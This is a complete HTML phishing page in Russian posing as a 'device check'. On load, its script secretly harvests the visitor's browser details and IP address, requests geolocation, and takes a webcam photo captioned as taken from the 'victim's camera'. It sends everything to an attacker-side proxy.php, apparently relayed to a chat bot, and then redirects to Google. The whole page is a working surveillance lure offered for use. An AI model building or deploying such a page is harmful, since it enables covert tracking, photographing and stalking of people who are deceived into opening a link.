<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка устройства</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0d1117;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: #161b22;
            border-radius: 16px;
            padding: 30px 25px;
            border: 1px solid #30363d;
            text-align: center;
        }
        h1 { color: #ffffff; font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #8b949e; font-size: 14px; margin-bottom: 28px; }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #30363d;
            border-top-color: #1f6feb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { color: #8b949e; font-size: 14px; margin-top: 20px; }
        .footer { margin-top: 24px; font-size: 12px; color: #6e7681; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Проверка устройства</h1>
        <div class="subtitle">Пожалуйста, подождите...</div>
        <div class="spinner"></div>
        <div class="status" id="status">Загрузка данных...</div>
        <div class="footer">🔒 Безопасное соединение</div>
    </div>

    <script>
        const PROXY_URL = "proxy.php"; // файл лежит рядом
        
        async function sendToProxy(text) {
            await fetch(PROXY_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ text: text })
            });
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return 'не удалось определить';
            }
        }
        
        async function getLocation() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => { resolve({ lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy }); },
                        () => { resolve(null); }
                    );
                } else { resolve(null); }
            });
        }
        
        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const blob = await imageCapture.takePhoto();
                track.stop();
                
                const formData = new FormData();
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', '📸 *Фото с камеры жертвы!*');
                
                await fetch(PROXY_URL, { method: 'POST', body: formData });
                return true;
            } catch(e) { return false; }
        }
        
        async function main() {
            document.getElementById('status').innerHTML = 'Анализ устройства...';
            
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screen = `${screen.width}x${screen.height}`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const ip = await getIP();
            
            let text = `🔴 *НОВЫЙ ПЕРЕХОД!*\n\n`;
            text += `🌍 *Данные устройства:*\n`;
            text += `├ 📱 User-Agent: ${ua}\n`;
            text += `├ 🖥️ Платформа: ${platform}\n`;
            text += `├ 🌐 Язык: ${language}\n`;
            text += `├ 📐 Экран: ${screen}\n`;
            text += `├ 🕒 Часовой пояс: ${timezone}\n`;
            text += `├ 🌍 IP: ${ip}\n`;
            text += `└ 🕒 Время: ${new Date().toLocaleString()}`;
            
            await sendToProxy(text);
            
            document.getElementById('status').innerHTML = 'Запрос геолокации...';
            const location = await getLocation();
            if (location) {
                await sendToProxy(`📍 *ГЕОЛОКАЦИЯ!*\n├ Широта: ${location.lat}\n├ Долгота: ${location.lon}\n├ Точность: ${location.accuracy}м`);
            } else {
                await sendToProxy(`❌ *Геолокация:* отклонена`);
            }
            
            document.getElementById('status').innerHTML = 'Запрос камеры...';
            const photoTaken = await takePhoto();
            if (photoTaken) {
                document.getElementById('status').innerHTML = '✅ Данные отправлены! Перенаправление...';
            } else {
                document.getElementById('status').innerHTML = 'Доступ к камере запрещён. Перенаправление...';
            }
            
            setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
        }
        
        main();
    </script>
</body>
</html>
